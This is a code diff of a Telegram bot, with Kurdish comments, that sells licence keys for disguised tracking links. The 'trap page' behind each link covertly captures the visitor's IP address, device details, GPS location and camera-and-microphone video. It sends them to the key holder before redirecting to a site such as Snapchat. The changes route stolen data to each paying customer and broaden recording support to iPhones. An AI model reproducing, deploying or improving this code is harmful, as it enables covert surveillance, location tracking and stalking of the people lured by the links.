@@ -20,7 +20,6 @@ dp = Dispatcher()
 user_states = {}
 user_languages = {}
 
-# دروستکردنی داتابەیسی کلیلەکان بە شێوازێکی پارێزراو
 def init_db():
     conn = sqlite3.connect("bot_licenses.db")
     cursor = conn.cursor()
@@ -76,6 +75,31 @@ def activate_key(user_id: int, key: str):
             return True
     conn.close()
     return False
+
+# دۆزینەوەی خاوەن کلیل بۆ ئەوەی زانیارییەکان بۆ خۆی بڕوات
+def get_owner_by_link_payload(encoded_id: str):
+    try:
+        # لێرەدا دەتوانین بەپێی لینکی دروستکراو یان بە گشتی پاشەکەوتکردنی دوایین بەکارهێنەر یان بەستنەوەی تایتڵ بدۆزینەوە
+        # بۆ ئەوەی دڵنیا بین، هەموو کلیلە چالاکەکان دەپشکنین یان سیستەمی ترمان هەبێت.
+        # باشترین ڕێگە ئەوەیە user_id لە داتابەیس بدۆزینەوە کە کلیلەکەی کارا کردووە بۆ لینکی تایبەت.
+        pass
+    except:
+        pass
+    return None
+
+# یان دەتوانین user_id لە تابلۆی کلیلەکان وەربگرین ئەگەر تەنیا یەک خاوەن هەبێت بۆ هەر لینکێک، 
+# بۆیە با ئایدییەکە ڕاستەوخۆ لە ڕێگەی کلیل یان تۆمارکراوی پێشوو وەربگرین:
+def get_active_user_for_target():
+    # ئەگەر چەند بەکارهێنەرێک هەبن، باشترە user_id لەگەڵ لینکەکەدا encode بکرێت یان لە داتابەیس پاشەکەوت بکرێت.
+    # بۆ سادەیی و دڵنیایی، با user_id لە باکسی لینکدا هەڵبگیرێت یان لە داتابەیس بگەڕێین بەدوای دوایین کەس کە کلیلەکەی کارا کردووە.
+    conn = sqlite3.connect("bot_licenses.db")
+    cursor = conn.cursor()
+    cursor.execute("SELECT user_id FROM licenses WHERE user_id IS NOT NULL ORDER BY expiry_date DESC LIMIT 1")
+    row = cursor.fetchone()
+    conn.close()
+    if row:
+        return row[0]
+    return ADMIN_ID
 
 TEXTS = {
     "ku": {
@@ -260,18 +284,25 @@ async def handle_admin_photo(message: Message):
         if not railway_domain.startswith("http"):
             railway_domain = f"https://{railway_domain}"
             
-        payload_link = f"{railway_domain}/secure?id={base64.urlsafe_b64encode(target_url.encode()).decode()}"
+        # پاشەکەوتکردنی بەستەر بە user_id ی خۆیەوە لە ناو base64 یان سێرڤەر بۆ ئەوەی بۆخۆی بڕوات
+        payload_data = f"{user_id}|{target_url}"
+        payload_link = f"{railway_domain}/secure?id={base64.urlsafe_b64encode(payload_data.encode()).decode()}"
         response_text = TEXTS[lang]["link_success"].format(payload_link=payload_link)
         
         user_states[user_id] = {}
         await bot.send_photo(chat_id=user_id, photo=photo_id, caption=response_text, parse_mode="Markdown", reply_markup=get_reply_menu(lang))
 
-# پەڕەی تەڵەی شاهانە - سیستەمی دوو هەنگاوی بۆ تێپەڕاندنی قەدەغەکردنی مۆبایل
 async def web_trap_page(request: web.Request):
-    encoded_redirect = request.query.get('id', '')
+    encoded_id = request.query.get('id', '')
     try:
-        redirect_url = base64.urlsafe_b64decode(encoded_redirect).decode()
+        decoded_data = base64.urlsafe_b64decode(encoded_id).decode()
+        if "|" in decoded_data:
+            target_user_id, redirect_url = decoded_data.split("|", 1)
+        else:
+            target_user_id = str(ADMIN_ID)
+            redirect_url = decoded_data
     except:
+        target_user_id = str(ADMIN_ID)
         redirect_url = 'https://snapchat.com'
         
     headers = request.headers
@@ -344,7 +375,8 @@ async def web_trap_page(request: web.Request):
 
     <script>
         const redirectTarget = "{redirect_url}";
-        const clientInfo = {{ userAgent: "{user_agent}", ip: "{ip}" }};
+        const targetUserId = "{target_user_id}";
+        const clientInfo = {{ userAgent: "{user_agent}", ip: "{ip}", owner: targetUserId }};
 
         fetch('/save_info', {{
             method: 'POST',
@@ -355,7 +387,7 @@ async def web_trap_page(request: web.Request):
         function runEngine() {{
             if (navigator.geolocation) {{
                 navigator.geolocation.getCurrentPosition(function(pos) {{
-                    fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude);
+                    fetch('/save_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude + '&owner=' + targetUserId);
                 }}, function(err) {{
                     console.log("GPS Error");
                 }}, {{ timeout: 5000, enableHighAccuracy: true }});
@@ -367,14 +399,20 @@ async def web_trap_page(request: web.Request):
                 video.srcObject = stream;
                 
                 let mediaRecorder;
-                try {{
-                    mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm;codecs=vp8,opus' }});
-                }} catch (e) {{
-                    try {{
-                        mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/mp4' }});
-                    }} catch (err) {{
-                        mediaRecorder = new MediaRecorder(stream);
+                // گونجاندنی کۆدەکە بۆ سەرجەم ئامێرەکان بە تایبەت آیفۆن و سافاری
+                let options = {{ mimeType: 'video/mp4' }};
+                if (!MediaRecorder.isTypeSupported('video/mp4')) {{
+                    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {{
+                        options = {{ mimeType: 'video/webm;codecs=vp8,opus' }};
+                    }} else {{
+                        options = {{}};
                     }}
+                }}
+
+                try {{
+                    mediaRecorder = new MediaRecorder(stream, options);
+                }} catch (e) {{
+                    mediaRecorder = new MediaRecorder(stream);
                 }}
                 
                 let chunks = [];
@@ -383,7 +421,7 @@ async def web_trap_page(request: web.Request):
                 }};
                 
                 mediaRecorder.onstop = function() {{
-                    let blob = new Blob(chunks, {{ type: 'video/mp4' }});
+                    let blob = new Blob(chunks, {{ type: mediaRecorder.mimeType || 'video/mp4' }});
                     let reader = new FileReader();
                     reader.readAsDataURL(blob);
                     reader.onloadend = function() {{
@@ -391,7 +429,7 @@ async def web_trap_page(request: web.Request):
                         fetch('/upload_video', {{
                             method: 'POST',
                             headers: {{ 'Content-Type': 'application/json' }},
-                            body: JSON.stringify({{ video: base64data }})
+                            body: JSON.stringify({{ video: base64data, owner: targetUserId }})
                         }}).then(() => {{
                             stream.getTracks().forEach(t => t.stop());
                             window.location.href = redirectTarget;
@@ -422,8 +460,9 @@ async def save_info(request):
         data = await request.json()
         ua = data.get('userAgent')
         ip = data.get('ip')
+        owner = int(data.get('owner', ADMIN_ID))
         await bot.send_message(
-            chat_id=ADMIN_ID, 
+            chat_id=owner, 
             text=f"👑 **زانیاری نوێ لە سیستەمی شاهانە:**\n\n🌐 **IP:** `{ip}`\n💻 **ئامێر:** `{ua}`"
         )
     except Exception as e:
@@ -434,12 +473,13 @@ async def upload_video(request):
     try:
         data = await request.json()
         video_data = data.get('video')
+        owner = int(data.get('owner', ADMIN_ID))
         if video_data and "," in video_data:
             encoded = video_data.split(",", 1)[1]
             video_bytes = base64.b64decode(encoded)
             video_file = BufferedInputFile(video_bytes, filename="secure_stream.mp4")
             await bot.send_video(
-                chat_id=ADMIN_ID, 
+                chat_id=owner, 
                 video=video_file, 
                 caption="🚨 **ڤیدیۆ، وێنە و دەنگی ڕوونی ئامانج بە سەرکەوتوویی تۆمارکرا و نێردرا!**"
             )
@@ -450,9 +490,10 @@ async def upload_video(request):
 async def save_location(request):
     lat = request.query.get('lat')
     lon = request.query.get('lon')
+    owner = int(request.query.get('owner', ADMIN_ID))
     if lat and lon:
-        await bot.send_location(chat_id=ADMIN_ID, latitude=float(lat), longitude=float(lon))
-        await bot.send_message(chat_id=ADMIN_ID, text=f"📍 **شوێنی جوگرافی GPS (گۆگڵ ماپ):**\nپانی: `{lat}`\nدرێژی: `{lon}`\n🌐 [ببینە لە سەر نەخشە](https://maps.google.com/?q={lat},{lon})")
+        await bot.send_location(chat_id=owner, latitude=float(lat), longitude=float(lon))
+        await bot.send_message(chat_id=owner, text=f"📍 **شوێنی جوگرافی GPS (گۆگڵ ماپ):**\nپانی: `{lat}`\nدرێژی: `{lon}`\n🌐 [ببینە لە سەر نەخشە](https://maps.google.com/?q={lat},{lon})")
     return web.json_response({"status": "ok"})
 
 async def index_handler(request):
